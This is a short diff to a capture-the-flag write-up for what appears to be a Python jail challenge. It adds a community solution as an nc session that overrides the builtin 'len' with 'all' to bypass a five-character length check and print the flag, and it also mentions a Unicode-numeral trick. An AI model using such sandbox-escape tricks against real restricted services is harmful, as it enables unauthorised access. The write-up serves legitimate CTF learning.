@@ -33,3 +33,19 @@ flag{1_2_3_4_5_6_7_8_9_10_exploit!_12_13_...}
 ```
 
 The length of `a=exit` is 6, but using [`ⅺ` (Unicode U+217A)](https://www.compart.com/en/unicode/U+217A) reduces it to 5. Then, `exit(flagbuf)` is called to print the flag.
+
+Solution by @xtea418 on Discord:
+
+```shell
+$ nc xn--fngelse-5wa.solven.jetzt 1024
+Side-channel: 4890
+Code: a=all
+Side-channel: 4890
+Code: len=a
+Side-channel: 4918
+Code: print(flagbuf)
+flag{1_2_3_4_5_6_7_8_9_10_exploit!_12_13_...}
+Side-channel: 4918
+```
+
+Idea: override `len=all`, so the length check `all(code) > 5` is bypassed.
